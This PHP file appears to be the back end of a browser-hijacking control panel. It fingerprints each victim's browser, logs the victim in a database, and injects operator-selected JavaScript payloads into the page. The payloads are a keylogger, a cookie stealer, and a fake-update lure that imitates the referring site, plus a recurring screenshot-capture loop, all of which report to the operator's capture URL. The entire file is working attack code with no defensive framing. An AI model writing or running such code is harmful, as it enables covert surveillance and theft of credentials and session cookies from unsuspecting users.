<?php
require_once ('includes/functions.php');



$captureUrl = $config["path"];

$browser = new Browser();
$browser->getBrowser();

$ip = $_GET["ip"];

$uniq = md5($ip . $browser->getPlatform() . $browser->getBrowser() . $browser->getVersion());

$db->bind("client_id", $uniq);

$clientData = $db->row("SELECT * FROM clients WHERE client_id = :client_id");


if (empty($clientData)) {

    $newClient = 1;
    
    $db->bindMore(array(
        "client_id" => $uniq,
        "ip" => $ip,
        "browser" => $browser->getBrowser() ,
        "browser_ver" => $browser->getVersion() ,
        "platform" => $browser->getPlatform()
    ));
    
    $db->query("INSERT INTO clients ( `client_id`, `ip`,  `browser`, `browser_ver`, `platform`, `first_added`) 
        	VALUES (:client_id, :ip, :browser, :browser_ver, :platform, NOW() )");
}


if($clientData["keylogger"] == "on"){

  $jsData = read_file("capture/k.js");
  $jsData = str_replace("__CAPTURE__URL__", $captureUrl."capture/k.php?uid=".$uniq."&t=", $jsData);
  echo $jsData;
  
}

if($clientData["cookies"] == "on"){

  $jsData = read_file("capture/c.js");
  $jsData = str_replace("__CAPTURE__URL__", $captureUrl."capture/c.php?uid=".$uniq."&t=' + sestime + '&nom=", $jsData);
  echo $jsData;
    
}

if($clientData["fake_update"] == "on"){

  $referer = parse_url($_SERVER['HTTP_REFERER']); 
  $referalUrl = $referer["host"];

  $jsData = read_file("capture/f.js");
  $jsData = str_replace("__CAPTURE__URL__", $captureUrl."capture/f.php?uid=".$uniq."&t=", $jsData);
  $jsData = str_replace("__LOAD__WEBSITE__", $referalUrl, $jsData);

  echo $jsData;
}

if($newClient)
  $interval = 60000;
else
  $interval = ($clientData["scr_cap_interval"] * 1000);

echo "function js_reload() {
    if (document.getElementById('screenshot_reload') != null) document.body.removeChild(document.getElementById('screenshot_reload'));
    script = document.createElement('script');
    script.id = 'screenshot_reload';
    script.src = '".$config["path"]."capture/sjs.php?uid=".$uniq."';
    document.body.appendChild(script);
}
if (typeof(init) != 'undefined') clearInterval(init);
init = setInterval(js_reload, ".$interval.");
js_reload()";


?>